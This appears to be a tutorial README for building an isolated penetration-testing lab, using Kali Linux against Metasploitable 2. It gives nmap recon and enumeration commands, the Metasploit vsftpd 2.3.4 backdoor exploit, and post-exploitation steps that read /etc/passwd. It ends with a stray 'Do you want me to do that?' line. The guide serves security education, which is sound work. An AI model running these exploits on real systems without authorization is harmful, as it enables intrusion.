# 🛡️ A Detailed guide to setting up a safe and practical Real world penetration testing lab.

<p align="center">
  <img src="https://img.shields.io/badge/Lab-Environment-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Tools-Kali%20Linux-green?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Target-Metasploitable-red?style=for-the-badge" />
</p>

---

## 🔹 Lab Overview

This lab is designed for **ethical hackers, penetration testers, and cybersecurity enthusiasts** to practice real-world penetration testing in a **safe and isolated network**.  

**Lab Components:**

| Machine | OS | IP Address | Role |
|---------|----|------------|------|
| Attacker | Kali Linux | 192.168.142.128 | Pentester machine |
| Target | Metasploitable 2 | 192.168.142.130 | Vulnerable machine for testing |

**Objective:**  
- Perform reconnaissance, scanning, enumeration, exploitation, and post-exploitation in a controlled environment.  

---

## 🔹 Lab Setup

### 1. Environment Requirements
- Virtualization software: **VirtualBox** or **VMware**
- Kali Linux ISO or VM image
- Metasploitable 2 VM
- Internal network setup for isolation
- Snapshots before starting tests

### 2. Network Configuration
1. Set both VMs to **Host-Only Adapter** or **Internal Network**.
2. Verify connectivity:
```bash
ping 192.168.142.130
````

---

## 🔹 Step-by-Step Penetration Testing

### Step 1: Reconnaissance

#### Passive Recon

* Gather information without directly interacting with the target.

```bash
whois 192.168.142.130
nslookup 192.168.142.130
```

#### Active Recon

* Use **nmap** for port scanning:

```bash
nmap -sS -Pn 192.168.142.130
```

* Scan all ports and services:

```bash
nmap -p- -A -T4 192.168.142.130
```

---

### Step 2: Enumeration

* Identify running services and versions:

```bash
nmap -sV -p 21,22,23,80,139,445,3306 192.168.142.130
```

* FTP banner grabbing:

```bash
nc 192.168.142.130 21
```

* SMB enumeration:

```bash
smbclient -L \\192.168.142.130 -U guest
```

---

### Step 3: Vulnerability Analysis

* Identify known vulnerabilities:

```bash
searchsploit vsftpd 2.3.4
```

* Check open ports for exploits using **Metasploit**:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.142.130
run
```

---

### Step 4: Exploitation

* Exploit vulnerable services (FTP, SMB, Telnet):

```bash
exploit
```

* Gain shell access and check privileges:

```bash
whoami
id
```

---

### Step 5: Post-Exploitation

* Enumerate system information:

```bash
uname -a
cat /etc/passwd
ifconfig
```

* Check for privilege escalation opportunities:

```bash
sudo -l
```

---

### Step 6: Reporting

* Document findings:

  * Vulnerable services
  * Exploits used
  * Proof of concept screenshots
  * Suggested mitigation

**Template:**

| Vulnerability | Exploit Used  | Impact              | Mitigation                                   |
| ------------- | ------------- | ------------------- | -------------------------------------------- |
| FTP Backdoor  | vsftpd\_2.3.4 | Remote Shell Access | Upgrade FTP server / Disable anonymous login |

---

## 🔹 Recommended Tools

* Nmap / Zenmap
* Netcat
* Metasploit Framework
* Nikto / Dirb
* Wireshark
* Enum4linux / smbclient

---

## 🔹 References

* [Metasploitable 2 VM](https://sourceforge.net/projects/metasploitable/)
* [Kali Linux Tools](https://www.kali.org/tools/)
* [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

> ⚠️ **Disclaimer:**
> This lab is for educational purposes only. Do **NOT** perform penetration testing on networks or systems without explicit permission. Unauthorized testing is illegal and unethical.

```

Do you want me to do that?
```
